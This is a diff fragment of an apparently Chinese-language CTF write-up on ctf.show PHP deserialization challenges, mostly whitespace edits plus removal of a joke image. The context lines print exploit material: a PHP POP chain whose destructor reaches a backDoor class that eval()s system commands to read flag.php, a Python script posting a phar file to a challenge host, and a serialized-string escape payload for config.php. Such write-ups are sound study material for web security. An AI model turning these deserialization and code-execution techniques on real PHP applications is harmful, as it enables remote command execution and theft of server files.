@@ -234,7 +234,7 @@
         private $password=&#39;xxxxxx&#39;;
         private $isVip=false;
         private $class = &#39;info&#39;;
-
+  
         public function __construct()&#123;
             $this-&gt;class=new backDoor();
         &#125;
@@ -244,7 +244,7 @@
         public function __destruct()&#123;
             $this-&gt;class-&gt;getInfo();
         &#125;
-
+  
     &#125;
     class backDoor&#123;
         private $code = &#39;system(&quot;ls&quot;);&#39;;  //执行后换成system(&quot;cat flag.php&quot;)
@@ -252,7 +252,7 @@
             eval($this-&gt;code);
         &#125;
     &#125;
-
+  
     echo urlencode(serialize(new ctfShowUser()));
 </code></pre>
 </li>
@@ -269,7 +269,7 @@
         public $password=&#39;xxxxxx&#39;;
         public $isVip=false;
         public $class = &#39;info&#39;;
-
+  
         public function __construct()&#123;
             $this-&gt;class=new backDoor();
         &#125;
@@ -279,7 +279,7 @@
         public function __destruct()&#123;
             $this-&gt;class-&gt;getInfo();
         &#125;
-
+  
     &#125;
     class backDoor&#123;
         public $code = &#39;system(&quot;ls&quot;);&#39;;  //执行后换成system(&quot;cat flag.php&quot;)
@@ -894,7 +894,7 @@ namespace&#123;
 <li><p>脚本：</p>
 <pre><code class="python">import requests
 import threading
-
+  
 u = &quot;http://ddd0d11f-a001-4dbd-9ec8-53fee7cc757d.challenge.ctf.show/&quot;
 f = open(&quot;1.phar&quot;, &#39;rb&#39;).read()
 
@@ -957,10 +957,6 @@ while 1:
 <pre><code class="txt">payload:
 wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;
 </code></pre>
-</li>
-<li><p>来，看笑话</p>
-<img src="images\image-20220827222917840.png" alt="image-20220827222917840" style="zoom:80%;" /></li>
-<li><p>我说呢我说呢我说呢怎么个事呢</p>
 </li>
 <li><p>f12找到base64编码后的字符串，去解码，得到flag</p>
 </li>
